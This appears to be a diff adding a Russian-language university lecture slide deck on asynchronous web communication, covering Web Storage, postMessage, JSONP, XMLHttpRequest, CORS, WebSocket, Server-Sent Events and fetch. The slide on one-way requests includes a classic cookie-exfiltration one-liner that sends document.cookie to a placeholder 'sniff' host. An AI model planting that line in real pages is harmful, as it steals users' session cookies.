@@ -1,0 +1,782 @@
+<!DOCTYPE HTML>
+<html lang="ru">
+<head>
+	<title>Web & DHTML - Асинхронное взаимодействие</title>
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<link rel="stylesheet" href="shower/themes/ribbon/styles/screen.css">
+	<link rel="stylesheet" href="web-dhtml.css">
+	<style>
+		ul.compact li { line-height: 1.5 }
+		pre.compact code { line-height: 1.5 }
+		table.demo { border-collapse:separate; border-spacing:2px; font-size:smaller }
+		table.demo th { background:dodgerblue; text-align:center}
+		table.demo td { background:lightblue; text-align:center}
+	</style>
+</head>
+<body class="list">
+
+<header class="caption">
+	<h1>Асинхронное взаимодействие</h1>
+</header>
+
+<section class="slide cover" id="Cover"><div>
+	<h2>Web и DHTML<br>AJAX и аналоги</h2>
+	<h3 id="h31">Леонид Волканин</h3>
+	<h3 id="h32">ИМКН УрФУ</h3>
+	<div class="arrow"></div>
+	<img src="pictures/UrFULogo_Russian.png" alt="">
+</div></section>
+
+<section class="slide"><div>
+	<h2>С кем и как взаимодействовать?</h2>
+	<ol>
+		<li>на клиенте (между страницами)
+			<ul>
+				<li>одного сайта</li>
+				<li>с кем угодно</li>
+			</ul>
+		</li>
+		<li>клиент-сервер
+		<ul>
+			<li>односторонее</li>
+			<li>двусторонее</li>
+			<ul>
+				<li>асинхронное</li>
+				<li>синхронное</li>
+			</ul>
+		</ul>
+		</li>
+	</ol>
+	<p>Хлебом не корми, только дай что-нибудь классифицировать...</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Обмен между страницами на клиенте</h2>
+	<p>Зачем?</p>
+	<p>Как?</p>
+	<ul>
+		<li>Web Storage</li>
+		<li>Web Messaging — http://www.w3.org/TR/webmessaging/</li>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>История локального хранилища до HTML5</h2>
+	<p>Cookie — тоже локальное хранилище :) Правда всего 4 Кб</p>
+	<p>Во время Первой Великой Войны браузеров Майкрософт изобрел очень много вещей, в т.ч. <a href="http://msdn.microsoft.com/en-us/library/ms531078%28v=VS.85%29.aspx">DHTML Behaviors</a>, а там — <a href="https://msdn.microsoft.com/en-us/library/ms531424%28VS.85%29.aspx">userData</a> (64 Кб)</p>
+	<p>Adobe включил во Flash в 2002 г. Local Shared Objects, библиотека AMASS (AJAX Massive Storage System) и др.</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Web Storage</h2>
+	<p>http://www.w3.org/TR/webstorage/</p>
+	<p><code>window.localStorage</code> и <code>window.sessionStorage</code>, <span style="font-size:smaller">даже в IE8</span></p>
+	<pre class="compact">
+	<code>function isLocalStorageAvailable() {</code>
+	<code>  try {</code>
+	<code>    return 'localStorage' in window && </code>
+	<code>           window['localStorage'] !== null;</code>
+	<code>  } catch (e) {</code>
+	<code>    return false;</code>
+	<code>  }</code>
+	<code>}</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>интерфейс Storage</h2>
+	<pre>
+	<code>interface Storage {</code>
+	<code>	readonly attribute unsigned long <mark>length</mark>;</code>
+	<code>	DOMString? <mark>key</mark>(unsigned long index);</code>
+	<code>	getter DOMString? <mark>getItem</mark>(DOMString key);</code>
+	<code>	setter void <mark>setItem</mark>(DOMString key, DOMString value);</code>
+	<code>	deleter void <mark>removeItem</mark>(DOMString key);</code>
+	<code>	void <mark>clear</mark>();</code>
+	<code>};</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>событие Storage</h2>
+	<p><code>addEventListener("storage", handle_storage, false);</code></p>
+	<p>у объекта StorageEvent</p>
+	<ul>
+		<li>key — ключ может быть добавлен, удален или изменен</li>
+		<li>oldValue — предыдущее значение (если переписано) или null</li>
+		<li>newValue — новое значение или null, если удалено</li>
+		<li>url — страница, которая вызывает метод, приведший к изменению</li>
+		<li>storageArea  — затронутое хранилище</li>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Web Storage — пример взаимодействия</h2>
+	<p>https://github.com/tejacques/crosstab (<a href="http://localhost:9000" target="_blank">тест</a>)<br>
+		<code>crosstab.broadcast(event, data, destination);</code><br>
+		<code>crosstab.on('eventName', function(message) { });</code></p>
+	<pre class="compact">
+	<code>var message = {</code>
+	<code>	id: string,          // The unique ID of this message</code>
+	<code>	event: string,       // The name of the event</code>
+	<code>	data: any,           // The data passed</code>
+	<code>	destination: string, // The destination tab</code>
+	<code>	origin: string,      // The origin tab</code>
+	<code>	timestamp: number    // The time the message was created</code>
+	<code>};</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Другие варианты хранения</h2>
+	<p>Web SQL Database — хорошая попытка, но умерла...</p>
+	<pre class="compact" style="font-size:smaller">
+	<code>openDatabase('documents', '1.0', 'Offline document storage', 5*1024*1024, function (db) {</code>
+	<code>	db.changeVersion('', '1.0', function (t) {</code>
+	<code>		t.executeSql('CREATE TABLE docids (id, name)');</code>
+	<code>	}, error);</code>
+	<code>});</code>
+	</pre>
+	<p>В качестве физического хранилища предлагалась sqlite</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Другие варианты хранения — IndexedDB</h2>
+	<p>IndexedDB — <a href="http://www.w3.org/TR/IndexedDB/" target="_blank">w3.org/TR/IndexedDB</a></p>
+	<pre class="compact" style="font-size:smaller">
+	<code>var request = indexedDB.open("library");</code>
+	<code>request.onupgradeneeded = function() {</code>
+	<code>	var db = request.result;</code>
+	<code>	var store = db.createObjectStore("books", {keyPath: "isbn"});</code>
+	<code>	var titleIndex = store.createIndex("by_title", "title", {unique: true});</code>
+	<code>	var authorIndex = store.createIndex("by_author", "author");</code>
+	<code>	store.put({title: "Quarry Memories", author: "Fred", isbn: 123456});</code>
+	<code>	store.put({title: "Water Buffaloes", author: "Fred", isbn: 234567});</code>
+	<code>	store.put({title: "Bedrock Nights", author: "Barney", isbn: 345678});</code>
+	<code>};</code>
+	<code>request.onsuccess = function() {</code>
+	<code>	db = request.result;</code>
+	<code>};</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Web Messaging — легальный XSS</h2>
+	<p>Свежий стандарт — 19 мая 2015, <a href="http://caniuse.com/#feat=channel-messaging" target="_blank">caniuse.com</a></p>
+	<pre class="compact">
+	<code>//в одном окне</code>
+	<code>var o = document.getElementsByTagName('iframe')[0];</code>
+	<code>o.contentWindow.postMessage('Hello world', 'http://e1.ru/');</code>
+	<hr>
+	<code>//в другом окне</code>
+	<code>window.addEventListener('<mark>message</mark>', receiver, false);</code>
+	<code>function receiver(e) {</code>
+	<code>	if (e.origin == 'http://example.com') {</code>
+	<code>		if (e.data == 'Hello world') {</code>
+	<code>			e.source.postMessage('Hello', e.origin);</code>
+	<code>		}</code>
+	<code>	}</code>
+	<code>}</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>интерфейс MessageEvent</h2>
+	<pre class="compact">
+	<code>interface MessageEvent : Event {</code>
+	<code>	readonly attribute any <mark>data</mark>;</code>
+	<code>	readonly attribute DOMString <mark>origin</mark>;</code>
+	<code>	readonly attribute DOMString <mark>lastEventId</mark>;</code>
+	<code>	readonly attribute (WindowProxy or MessagePort)? <mark>source</mark>;</code>
+	<code>	readonly attribute MessagePort[]? <mark>ports</mark>;</code>
+	<code>}</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Web Messaging — потоки</h2>
+	<pre>
+	<code>var channel = new MessageChannel();</code>
+	<code>otherWindow.postMessage('hello', 'http://example.com',<br>	[channel.port2]);</code>
+	<code>channel.port1.postMessage('hello');</code>
+	<code>channel.port1.onmessage = handleMessage;</code>
+	<code>function handleMessage(event) {</code>
+	<code>	// сообщение в event.data</code>
+	<code>}</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Web Messaging — пример</h2>
+	<p>mdn.github.io/channel-messaging-multimessage</p>
+	<iframe src="http://mdn.github.io/channel-messaging-multimessage/" width="100%" height="100%"></iframe>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>Взаимодействие с сервером</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Определения</h2>
+	<p>AJAX (аббревиатура от «Asynchronous Javascript And Xml») — технология обращения к серверу без перезагрузки страницы</p>
+	<p>COMET — общий термин, описывающий различные техники получения данных по инициативе сервера</p>
+	<p>Можно сказать, что AJAX — это «отправил запрос — получил результат», а COMET — это «непрерывный канал, по которому приходят данные»</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>«Одностороннее» взаимодействие</h2>
+	<p>Когда ответ от сервера не нужен</p>
+	<p><code>new/**/Image().src='http://host/sniff?c='+ escape(document.cookie);</code></p>
+	<p>Также динамическое подключение сценариев, CSS и пр.</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>IFRAME для AJAX</h2>
+	<p>IFRAME — самый древний кросс-браузерный способ AJAX-запросов</p>
+	<pre class="compact" style="font-size:smaller">
+	<code>// Окно из iframe</code>
+	<code>var iframeWin = iframe.contentWindow;</code>
+	<code>// Можно получить и через frames, если мы знаем имя iframe (и оно у него есть)</code>
+	<code>var iframeWin = window.frames[iframe.name];</code>
+	<code>iframeWin.parent == window; // parent из iframe указывает на родительское окно</code>
+	<code>// Документ не будет доступен, если iframe с другого домена</code>
+	<code>var iframeDoc = iframe.contentWindow.document;</code>
+	</pre>
+	<p>Общий принцип использования: динамически создать, сделать запрос, удалить (т.к. навигация в нём попадает в историю посещений)</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Алгоритм общения с сервером (IFRAME)</h2>
+	<ol>
+	<li>Создаём iframe со случайным именем iframeName</li>
+	<li>В основном окне — объект Callback, в котором (Callback[iframeName]) функция, обрабатывающая результат</li>
+	<li>Отправляем GET или POST-запрос</li>
+	<li>Сервер отвечает как-то так: <code style="font-size:smaller">&lt;script&gt;parent.Callback[window.name]({данные});&lt;/script&gt;</code></li>
+	<li>Нужен обработчик iframe.onload — он сработает и проверит, выполнилась ли функция Callback[window.name]</li>
+	</ol>
+</div></section>
+
+<section class="slide"><div>
+	<h2>IFRAME для COMET</h2>
+	<p>Бесконечный IFRAME — самый старый способ организации COMET</p>
+	<p>Классическая реализация — клиент создает невидимый IFRAME, ведущий на служебный URL</p>
+	<p>Сервер, получив соединение на этот URL, не закрывает его, а время от времени присылает блоки сообщений &lt;script&gt;...javascript...&lt;/script&gt;</p>
+	<p>IFrame при этом работает только на получение данных с сервера</p>
+	<p>Для запросов используется обычный XMLHttpRequest</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Протокол JSONP</h2>
+	<p>Если создать тег <code>&lt;script src='...'&gt;</code>, то при добавлении в документ запустится процесс загрузки</p>
+	<p>В ответ сервер может прислать скрипт, содержащий нужные данные</p>
+	<p>Таким образом можно запрашивать данные с любого сервера, в любом браузере</p>
+	<p>Протокол JSONP (JSON with Padding) — это «надстройка» над таким способом коммуникации</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Зачем нужен JSONP ?</h2>
+	<p>И так ведь будет работать:</p>
+	<pre class="compact" style="margin:0">
+	<code>function addScript(src) {</code>
+	<code>	var elem = document.createElement("script");</code>
+	<code>	elem.src = src;</code>
+	<code>	document.head.appendChild(elem);</code>
+	<code>}</code>
+	<code>addScript('user?id=123');</code>
+	</pre>
+	<p>Браузер по script.onload узнает, что получен ответ сервера:<br><code>var user = {name: "Вася", age: 25 };</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Как работает JSONP</h2>
+	<p>Если одновременно делается несколько запросов?<br>Присваивать в разные переменные?</p>
+	<ol>
+	<li>Вместе с запросом клиент передаёт название функции. Обычно параметр называется callback: <code>addScript('user?id=123&callback=onUserData');</code></li>
+	<li>Cервер оборачивает данные (JSON) в вызов функции-callback: <code>onUserData<sup>*</sup>({ name: "Вася", age: 25});</code></li>
+	</ol>
+</div></section>
+
+<section class="slide"><div>
+	<h2>COMET с помощью JSONP</h2>
+	<p>Точно так же — long polling (длинные запросы)</p>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>XMLHttpRequest</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>XMLHttpRequest</h2>
+	<pre class="compact">
+	<code>// 1. Создаём новый объект XMLHttpRequest</code>
+	<code>var xhr = new XMLHttpRequest();</code>
+	<code>// 2. Конфигурируем его: GET-запрос на URL 'phones.json'</code>
+	<code>xhr.open('GET', 'phones.json', false);</code>
+	<code>// 3. Отсылаем запрос</code>
+	<code>xhr.send();</code>
+	<code>// 4. Если код ответа сервера не 200, то это ошибка</code>
+	<code>if (xhr.status != 200) {</code>
+  	<code>	alert( xhr.status + ': ' + xhr.statusText );</code>
+	<code>} else {</code>
+	<code>	alert( xhr.responseText );</code>
+	<code>}</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>XMLHttpRequest</h2>
+	<p><code>xhr.open(method, URL, [async], [user], [password])</code></p>
+	<p>Вызов open не открывает соединение!</p>
+	<p><code>xhr.send([body])</code> — отослать данные, тело есть при методе POST</p>
+	<p><code>xhr.abort()</code> — прервать выполнение запроса</p>
+	<p>Ответ: <code>status</code> (0, 200, 404, 404, ...), <code>statusText</code>, <code>responseText</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>XMLHttpRequest</h2>
+	<p>Если сервер вернул XML (Content-type: text/xml), то  можно будет делать запросы <code>xhr.responseXml.querySelector(...)</code> и др.</p>
+	<p>Обычно используют JSON</p>
+	<p>Сервер возвращает JSON в виде текста, который браузер превращает в объект вызовом <code>JSON.parse(xhr.responseText)</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Синхронные и асинхронные запросы</h2>
+	<p>Если в методе open установить async = false или просто забыть его указать, то запрос будет синхронным</p>
+	<pre class="compact">
+	<code>xhr.open('GET', 'db.json', <mark>true</mark>);</code>
+	<code>xhr.send();</code>
+	<code>xhr.onreadystatechange = function() {</code>
+	<code>	if (xhr.readyState != 4) return;</code>
+	<code>	if (xhr.status != 200) {</code>
+	<code>		alert(xhr.status + ': ' + xhr.statusText);</code>
+	<code>	} else {</code>
+	<code>		alert(xhr.responseText);</code>
+	<code>	}</code>
+	<code>}</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>readyState</h2>
+	<pre>
+	<code>UNSENT = 0; // начальное состояние</code>
+	<code>OPENED = 1; // вызван open</code>
+	<code>HEADERS_RECEIVED = 2; // получены заголовки</code>
+	<code>LOADING = 3; // загружается тело (получен очередной пакет)</code>
+	<code>DONE = 4; // запрос завершён</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>HTTP-заголовки</h2>
+	<p><code>setRequestHeader(name, value)</code>, нельзя установить Referer или Host и <a href="http://www.w3.org/TR/XMLHttpRequest/#the-setrequestheader()-method" target="_blank">ряд других</a></p>
+	<p style="margin:0">Поставленный заголовок нельзя снять</p>
+	<pre class="compact" style="margin:0">
+	<code>xhr.setRequestHeader('X-Auth', '123');</code>
+	<code>xhr.setRequestHeader('X-Auth', '456');</code>
+	<code>// X-Auth: 123, 456</code>
+	</pre>
+	<p><code>getResponseHeader(name)</code> — возвращает значение заголовка ответа, кроме Set-Cookie</p>
+	<p><code>getAllResponseHeaders()</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Таймаут</h2>
+	<p>Максимальную продолжительность асинхронного запроса можно задать свойством <code>timeout</code></p>
+	<p>При превышении этого времени запрос будет оборван и сгенерировано событие ontimeout:</p>
+	<pre>
+	<code>xhr.ontimeout = function() {</code>
+	<code>	alert('ой, всё...');</code>
+	<code>}</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Полный список событий</h2>
+	<p>Cпецификация предусматривает следующие события:</p>
+	<ul>
+	<li>loadstart — запрос начат</li>
+	<li>progress — браузер получил очередной пакет данныхt</li>
+	<li>abort — запрос был отменён вызовом xhr.abort()</li>
+	<li>error — произошла ошибка</li>
+	<li>load — запрос был успешно (без ошибок) завершён</li>
+	<li>timeout — запрос был прекращён по таймауту</li>
+	<li>loadend — запрос был завершён (успешно или неуспешно)</li>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Кеширование</h2>
+	<p>Ответы на запросы XMLHttpRequest кешируются, как страницы</p>
+	<p>Заголовки <code>Expires</code>, <code>Last-Modified</code> и <code>Cache-Control</code> дают понять браузеру, что следует делать</p>
+	<p>IE9- по умолчанию кеширует все ответы, не снабжённые антикеш, поэтому сервер должен добавить <code>Cache-Control: no-cache</code></p>
+	<p>Альтернативный вариант (по историческим причинам)</p>
+	<p><code>xhr.open('GET','service?r=' + Math.random(),false);</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Формы и кодировка</h2>
+	<p>При отправке формы браузер собирает значения полей, составляет тело GET/POST-запроса</p>
+	<p>При отправке через XMLHttpRequest это нужно делать самим</p>
+	<p>JavaScript знает <code>decodeURI</code>, <code>encodeURI</code>, <code>encodeURIComponent</code></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Кодировка urlencoded</h2>
+	<p>Браузер перечисляет пары «имя=значение» через амперсанд &amp;</p>
+	<p>Все символы, кроме английских букв, цифр и <code>- _ . ! ~ * ' ( )</code> заменяются на их цифровой код в UTF-8 со знаком %</p>
+	<p>Например, пробел заменяется на %20, символ / на %2F, русские буквы кодируются двумя байтами в UTF-8</p>
+	<pre class="compact">
+	<code>alert( encodeURIComponent(' ') ); // %20</code>
+	<code>alert( encodeURIComponent('/') ); // %2F</code>
+	<code>alert( encodeURIComponent('В') ); // %D0%92</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>метод POST</h2>
+	<p>Параметры передаются в теле запроса: <code>xhr.send(body)</code></p> 
+	<p>Обязателен заголовок Content-Type, содержащий кодировку</p>
+	<p>В стандартных формах — три кодировки (атрибут enctype):</p>
+	<ul>
+	<li>application/x-www-form-urlencoded</li>
+	<li>multipart/form-data</li>
+	<li>text-plain</li>
+	</li>
+</div></section>
+
+<section class="slide"><div>
+	<h2>multipart/form-data</h2>
+	<pre class="compact">
+	<code>Content-Type: multipart/form-data; boundary=RaNdOmDeLiMiTeR</code>
+	<code>&nbsp;</code>
+	<code>--RaNdOmDeLiMiTeR</code>
+	<code>Content-Disposition: form-data; name="name"</code>
+	<code>&nbsp;</code>
+	<code>Виктор</code>
+	<code>--RaNdOmDeLiMiTeR</code>
+	<code>Content-Disposition: form-data; name="surname"</code>
+	<code>&nbsp;</code>
+	<code>Цой</code>
+	<code>--RaNdOmDeLiMiTeR--</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Отправка файла</h2>
+	<p>Можно создать запрос, который сервер воспримет как загрузку файла</p>
+	<p>Нужно использовать тот же код, добавив заголовки перед файлом</p>
+	<pre class="compact">
+	<code>Content-Disposition: form-data; name="fname"; filename="p.jpg"</code>
+	<code>Content-Type: image/jpeg</code>
+	<code>&nbsp;</code>
+	<code>содержимое файла</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>объект FormData</h2>
+	<p>Конструктор new FormData([form]) вызывается либо без аргументов, либо с DOM-элементом формы</p>
+	<p>Метод formData.append(name, value) добавляет данные к форме</p>
+	<p>Можно сразу отсылать, кодировка при этом будет multipart/form-data</p>
+	<pre class="compact">
+	<code>var formData = new FormData(document.forms.person);</code>
+	<code>formData.append("patronym", "Робертович");</code>
+	<code>xhr.send(formData);</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Другие кодировки</h2>
+	<p>XMLHttpRequest сам не ограничивает кодировку и формат данных</p>
+	<p>Часто используется формат JSON</p>
+	<pre class="compact">
+	<code>var json = JSON.stringify({</code>
+	<code>	name: "Виктор", surname: "Цой"</code>
+	<code>});</code>
+	<code>xhr.open("POST", '/submit');</code>
+	<code>xhr.setRequestHeader('Content-type',<br>	'application/json; charset=utf-8');</code>
+	<code>// Сервер должен уметь такой Content-Type принимать</code>
+	<code>xhr.send(json);</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Кросс-доменные запросы</h2>
+	<p><a href="http://www.w3.org/TR/cors/" target="_blank">CORS</a> — специальные ограничения, <mark>простыми</mark> считаются запросы</p>
+	<ol style="margin:0">
+		<li>Простой метод: GET, POST или HEAD</li>
+		<li>Простые заголовки — только из списка:</li>
+		<ul>
+			<li>Accept, Accept-Language, Content-Language</li>
+			<li>Content-Type со значением application/x-www-form-urlencoded, multipart/form-data или text/plain</li>
+		</ul>
+	</ol>
+	<p>«<mark>Непростыми</mark>» считаются все остальные, например, запрос с методом PUT или с заголовком Authorization</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>CORS для простых запросов</h2>
+	<p><img src="pictures/xhr-another-domain.png" width="80%"></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>CORS и заголовки ответа</h2>
+	<p>По умолчанию можно читать только «простые» заголовки: Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma</p>
+	<p>Другие нужно указывать явно:</p>
+	<pre class="compact">
+	<code>HTTP/1.1 200 OK</code>
+	<code>Content-Type:text/html; charset=UTF-8</code>
+	<code>Access-Control-Allow-Origin: *</code>
+	<code>X-Uid: 123</code>
+	<code>X-Authorization: 2c9de507f2c54aa1</code>
+	<code><mark>Access-Control-Expose-Headers</mark>: X-Uid, X-Authentication</code>
+	</pre>
+	</div></section>
+
+<section class="slide"><div>
+	<h2>CORS и запросы от имени пользователя</h2>
+	<p>По умолчанию браузер не передаёт авторизующие заголовки</p>
+	<p>Нужно поставить запросу <code>xhr.withCredentials = true</code></p>
+	<p>Сервер должен вернуть уже не один, а два заголовка:</p>
+	<pre class="compact">
+	<code>Access-Control-Allow-Origin: домен</code>
+	<code>Access-Control-Allow-Credentials: true</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>CORS и «непростые» запросы</h2>
+	<p>Многие верят, что «если метод — нестандартный, то это не браузер»</p>
+	<p>Для запросов с «непростым» методом или особыми заголовками браузер делает предзапрос OPTIONS, указывая их в Access-Control-Request-Method и Access-Control-Request-Headers</p>
+	<p>Браузер ожидает ответ со статусом 200, без тела, со списком разрешённых методов и заголовков в Access-Control-Allow-Method и Access-Control-Allow-Headers</p>
+</div></section>
+
+<section class="slide"><div>
+	<p><img src="pictures/xhr-preflight.png" width="70%"></p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>XMLHttpRequest: индикация прогресса</h2>
+	<p>Запрос XMLHttpRequest состоит из двух фаз</p>
+	<ul>
+	<li>Upload, может быть долгой для POST-запросов. Для отслеживания прогресса — <code>xhr.upload</code> (объект XMLHttpRequestUpload и события)</li>
+	<li>Download, на этой стадии используется обработчик <code>xhr.onprogress</code></li>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>XMLHttpRequestUpload</h2>
+	<p>У этого объекта нет методов, он генерирует события</p>
+	<ul>
+	<li>load / loadstart / loadend</li>
+	<li>progress — <code>xhr.upload.onprogress = function(event) { console.log(event.loaded+'/'+event.total) }</code></li>
+	<li>abort</li>
+	<li>error</li>
+	<li>timeout</li>
+	</ul>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>WebSocket</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>WebSocket</h2>
+	<p>Протокол WebSocket (RFC 6455) работает над HTTP, снимает ограничения на обмен данными между браузером и сервером</p>
+	<p>Он позволяет пересылать любые данные, на любой домен, безопасно и почти без лишнего сетевого трафика</p>
+	<p><code>var socket = new WebSocket("ws://server.ru/ws")</code></p>
+	<p>4 события: при получении данных и при изменениях в состоянии соединения</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Установка соединения</h2>
+	<p>Браузер отправляет заголовки: «поддерживает ли сервер WebSocket?»</p>
+	<p><code>new WebSocket("ws://server.example.com/chat")</code></p>
+	<pre class="compact">
+	<code>GET /chat HTTP/1.1</code>
+	<code>Host: server.example.com</code>
+	<code>Upgrade: websocket</code>
+	<code>Connection: Upgrade</code>
+	<code>Origin: http://server.ru</code>
+	<code>Sec-WebSocket-Key: Iv8io/9s+lYFgZWcXczP8Q==</code>
+	<code>Sec-WebSocket-Version: 13</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Установка соединения</h2>
+	<p>Такой XMLHttpRequest (подделать WebSocket) создать нельзя</p>
+	<p>Если сервер отвечает «да, поддерживаю», то HTTP прекращается и общение идёт на специальном протоколе WebSocket, который уже не имеет с HTTP ничего общего</p>
+	<pre class="compact">
+	<code>HTTP/1.1 101 Switching Protocols</code>
+	<code>Upgrade: websocket</code>
+	<code>Connection: Upgrade</code>
+	<code>Sec-WebSocket-Accept: hsBlbuDTkk24srzEOTBUlZAlC2g=</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Secure WS</h2>
+	<p>Соединение WebSocket можно открывать как WS:// или как WSS:// (WebSocket над HTTPS)</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Взаимодействие</h2>
+	<p><code>socket.send(data)</code>, пересылать можно любые данные</p>
+	<pre class="compact">
+	<code>socket.onopen = function() { ... };</code>
+	<code>socket.onclose = function(event) {</code>
+	<code>	if (event.wasClean) { // чистое закрытие }</code>
+	<code>};</code>
+	<code>socket.onmessage = function(event) {</code>
+	<code>	// Получены данные — event.data</code>
+	<code>};</code>
+	<code>socket.onerror = function(error) {</code>
+	<code>	// Ошибка — error.message</code>
+	<code>};</code>
+	</pre>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>Server-Sent<br>Events</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Server-Sent Events</h2>
+	<p>Свежий стандарт — 3 февраля 2015, <a href="http://www.w3.org/TR/eventsource/" target="_blank">w3.org/TR/eventsource</a></p>
+	<p><a href="http://caniuse.com/#feat=eventsource" target="_blank">caniuse.com</a></p>
+	<p>Стандарт позволяет браузеру создавать специальный объект <mark>EventSource</mark>, который сам обеспечивает соединение с сервером, делает пересоединение в случае обрыва и генерирует события при поступлении данных</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Получение сообщений</h2>
+	<pre class="compact" style="margin:0">
+	<code>var eventSource = new EventSource("/events/subscribe");</code>
+	<code>eventSource.onmessage = function(e) {</code>
+	<code>	console.log("Пришло сообщение: " + e.data);</code>
+	<code>};</code>
+	</pre>
+	<p>Cервер должен ответить <code>Content-Type: text/event-stream</code>, оставить соединение и писать в  формате:</p>
+	<pre class="compact" >
+	<code>data: Сообщение 1</code>
+	<code>&nbsp;</code>
+	<code>data: Сообщение 2</code>
+	<code>data: из двух строк</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Восстановление соединения</h2>
+	<p>При создании объекта браузер автоматически подключается к серверу, а при обрыве — пытается его возобновить (обычно 1-3 сек)</p>
+	<pre class="compact" style="margin:0">
+	<code>retry: 15000</code>
+	<code>data: Поставлена задержка 15 секунд</code>
+	</pre>
+	<p>Сервер может маркировать сообщения идентификатором:</p>
+	<pre class="compact" style="margin:0">
+	<code>data: данные</code>
+	<code>id: 100500</code>
+	</pre>
+	<p>Используется в <code>eventSource.lastEventId</code> и в заголовке <code>Last-Event-ID: 100500</code></p>
+</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Как полностью закрыть соединение?</h2>
+	<ul>
+	<li>Со стороны сервера — ответить со статусом не 200, или ответить с Content-Type, не совпадающим с text/event-stream</li>
+	<li>Со стороны клиента — <code>eventSource.close()</code></li>
+	</ul>
+</div></section>
+
+<section class="slide"><div>
+	<h2>События</h2>
+	<ul style="margin:0">
+	<li>onmessage — пришло сообщение, доступно как event.data</li>
+	<li>onopen — при успешном установлении соединения</li>
+	<li>onerror — при ошибке соединения</li>
+	</ul>
+	<pre class="compact" style="margin:0">
+	<code>eventSource.onopen = function(e) {</code>
+	<code>	console.log("Соединение открыто");</code>
+	<code>};</code>
+	<code>eventSource.onerror = function(e) {</code>
+	<code>	if (this.readyState == EventSource.CONNECTING) {</code>
+	<code>		console.log("Соединение порвалось, пересоединяемся...");</code>
+	<code>	} else {</code>
+	<code>		console.log("Ошибка, состояние: " + this.readyState);</code>
+	<code>	}</code>
+	<code>};</code>
+	</pre>
+</div></section>
+
+<section class="slide"><div>
+	<h2>События</h2>
+	<p>Можно задать своё имя события:</p>
+	<pre class="compact">
+	<code>event: join</code>
+	<code>data: Вася</code>
+	</pre>
+	<p>Тогда обработчик вешаем так:</p>
+	<pre class="compact">
+	<code>eventSource.addEventListener('join', function(e) {</code>
+	<code>	alert( 'Пришёл ' + e.data );</code>
+	<code>});</code>
+	</pre>
+</div></section>
+
+<section class="slide shout"><div>
+	<h2>FETCH: замена XMLHttpRequest</h2>
+</div></section>
+
+<section class="slide"><div>
+	<h2>FETCH</h2>
+	<p>Метод fetch — это XMLHttpRequest нового поколения</p>
+	<p><a href="https://fetch.spec.whatwg.org/">fetch.spec.whatwg.org</a></p>
+	<p>Улучшенный интерфейс для осуществления запросов к серверу:<br>как по части возможностей и контроля над происходящим, так и по синтаксису, так как построен на промисах</p>
+	<p>Поддержка в браузерах пока не очень распространена, но есть <a href="https://github.com/github/fetch" target="_blank">полифилл</a> и не один</p>
+</div></section>
+
+<section class="slide"><div>
+	<h2>Синтаксис</h2>
+	<p><code>let promise = fetch(url[, options]);</code></p>
+	<p>Свойства options:</p>
+	<ul class="compact">
+	<li>method — метод запроса</li>
+	<li>headers — заголовки запроса (объект)</li>
+	<li>body — тело запроса: FormData, Blob, строка и т.п.</li>
+	<li>mode — «same-origin», «no-cors», «cors»</li>
+	<li>credentials — «omit», «same-origin», «include»</li>
+	<li>cache — «default», «no-store», «reload», «no-cache», «force-cache»</li>
+	<li>redirect — «follow» для обычного поведения при коде 30x или «error» для интерпретации редиректа как ошибки</li>
+	</ul>
+</div></section>
+
